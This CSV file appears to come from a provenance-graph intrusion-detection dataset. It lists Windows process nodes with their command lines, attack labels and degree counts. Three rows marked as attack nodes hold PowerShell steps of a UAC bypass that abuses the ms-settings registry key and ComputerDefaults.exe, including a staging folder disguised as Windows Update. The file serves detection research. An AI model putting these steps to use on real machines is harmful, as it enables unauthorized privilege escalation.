uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
f73ed0f6-5c4f-4968-b48f-0ad9bfd7dfcb,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MsMpEng.exe""'}",368,False,0,12,12,0,7812,7812
d0bedf01-a23c-439b-8733-62a2eba50520,"{'subject': '""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --no-startup-window'}",341,False,0,440,440,0,440,440
efc8e9cd-038a-4290-9d7d-6cc4a9e1c702,{'subject': 'C:\\Windows\\Explorer.EXE'},286,False,0,166,166,0,166,166
f561436b-c33f-4223-9aa5-384233be9016,"{'subject': 'cmd /k """"C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\..\\init.bat"" ""'}",982,False,0,3,3,0,78,78
b2149f66-e885-4e67-991c-ffb62befc963,"{'subject': '""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=zh-CN --service-sandbox-type=none --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=2380'}",345,False,0,69,69,0,69,69
86600a8f-f7f5-4622-848b-007eb393b69a,"{'subject': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""  -Command ""Get-Host'}",1646,False,0,39,39,0,56,56
7c7166d2-1f53-4421-a16e-ee9a8492baca,"{'subject': 'powershell.exe -Command ""Start-Process \\""C:\\Windows\\System32\\ComputerDefaults.exe\\""""'}",8445,True,0,52,52,0,52,52
0e276fa8-de4c-4c03-b0b1-737e0debadf3,"{'subject': '""C:\\Windows\\system32\\SearchProtocolHost.exe"" Global\\UsGthrFltPipeMssGthrPipe11_ Global\\UsGthrCtrlFltPipeMssGthrPipe11 1 -2147483646 ""Software\\Microsoft\\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc"" ""DownLevelDaemon"" '}",393,False,0,4,4,0,49,49
a46b38b6-90ab-44bf-9615-2e13b648e26b,"{'subject': 'powershell.exe -Command ""New-Item -ItemType Directory -path \\""$env:APPDATA\\Microsoft\\Windows\\Update\\\\\\""""'}",7052,True,0,47,47,0,47,47
661791d2-3887-475f-90f8-083e6b6dae6c,"{'subject': 'powershell.exe -Command ""New-Item \\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"" -Force""'}",8087,True,0,45,45,0,45,45
037730a3-5d83-4573-b8db-47cae3812750,"{'subject': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""  -Command ""$ProgressPreference=\'SilentlyContinue\' ; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Headers @{\\""cache-control\\""=\\""no-cache\\""} -UseBasicParsing https://api.github.com/repos/chrisant996/clink/releases/latest'}",1707,False,0,39,39,0,44,44
